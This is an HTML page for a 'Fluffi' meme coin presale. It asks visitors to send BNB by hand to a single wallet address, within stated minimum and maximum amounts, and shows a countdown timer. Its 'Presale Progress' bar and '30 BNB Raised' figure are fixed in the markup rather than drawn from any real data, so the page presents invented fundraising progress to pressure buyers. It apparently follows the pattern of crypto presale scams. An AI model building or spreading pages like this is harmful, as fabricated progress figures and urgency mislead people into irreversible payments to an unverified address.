<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fluffi Meme Coin Presale</title>
  <style>
    body {
      text-align: center;
      background-color: #fff8f0;
      font-family: Arial, sans-serif;
    }
    img {
      width: 450px;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
      margin-top: 40px;
    }
    h1 {
      margin-top: 20px;
      font-size: 2.5em;
      color: #333;
    }
    h2 {
      color: #ff6600;
      margin-top: 20px;
    }
    .wallet-box {
      margin-top: 30px;
    }
    input {
      width: 300px;
      padding: 10px;
    }
    button {
      padding: 10px 20px;
      background-color: #ff6600;
      color: white;
      border: none;
      border-radius: 10px;
      margin-left: 10px;
      cursor: pointer;
    }
    .timer-box {
      margin-top: 30px;
    }
  </style>
</head>
<body>

  <h1>🚀 Fluffi Token Presale</h1>

  <img src="fluffi.jpg" alt="Fluffi Meme Coin">

  <h2>The Future of Meme Coins is Fluffy! 🚀</h2>

  <p>Send BNB to the wallet address below to participate:</p>

  <div class="wallet-box">
    <input type="text" id="wallet" value="0xFc3381a6AA1d134DDf22f641E97c92C400959910" readonly>
    <button onclick="copyWallet()">Copy Address</button>
  </div>

  <p><strong>Minimum:</strong> 0.1 BNB &nbsp; | &nbsp; <strong>Maximum:</strong> 5 BNB</p>

  <div class="timer-box">
    <h2>Presale Countdown</h2>
    <p id="countdown">Loading timer...</p>
  </div>

  <!-- Presale Progress Bar -->
  <div style="margin-top: 40px;">
    <h2 style="color: #333;">Presale Progress</h2>
    <div style="background-color: #ddd; border-radius: 20px; overflow: hidden; width: 80%; margin: 0 auto;">
      <div id="progress-bar" style="background-color: #ff6600; width: 30%; height: 30px;"></div>
    </div>
    <p id="progress-text" style="margin-top: 10px;">30 BNB Raised / 100 BNB Goal</p>
  </div>

  <!-- Buy Now Button -->
  <div style="margin-top: 40px;">
    <button style="padding: 15px 30px; font-size: 20px; background-color: #ff6600; color: white; border: none; border-radius: 10px; cursor: pointer;" onclick="buyNow()">
      Buy Fluffi Token Now 🚀
    </button>
  </div>

  <script>
    function copyWallet() {
      var copyText = document.getElementById("wallet");
      copyText.select();
      copyText.setSelectionRange(0, 99999);
      document.execCommand("copy");
      alert("Wallet Address Copied: " + copyText.value);
    }

    function buyNow() {
      alert("Connect your wallet manually and send BNB to: 0xFc3381a6AA1d134DDf22f641E97c92C400959910");
    }

    // Countdown Timer (Example - can update time)
    var countdownDate = new Date("May 30, 2025 23:59:59").getTime();
    var x = setInterval(function() {
      var now = new Date().getTime();
      var distance = countdownDate - now;
      var days = Math.floor(distance / (1000 * 60 * 60 * 24));
      var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      var seconds = Math.floor((distance % (1000 * 60)) / 1000);
      document.getElementById("countdown").innerHTML = days + "d " + hours + "h " + minutes + "m " + seconds + "s ";
      if (distance < 0) {
        clearInterval(x);
        document.getElementById("countdown").innerHTML = "Presale Ended";
      }
    }, 1000);
  </script>

</body>
</html>
